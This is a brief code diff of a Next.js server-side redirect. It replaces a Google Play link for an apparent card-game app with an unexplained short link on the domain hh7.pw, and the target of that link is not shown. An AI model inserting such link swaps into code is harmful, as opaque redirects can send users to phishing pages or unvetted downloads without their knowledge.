@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
       redirect: {
         permanent: false,
         destination: `${
-          'https://play.google.com/store/apps/details?id=com.teenpattimaster.theapk.app' 
+          'https://hh7.pw/aw/nx65k' 
         }`,
       },
     };
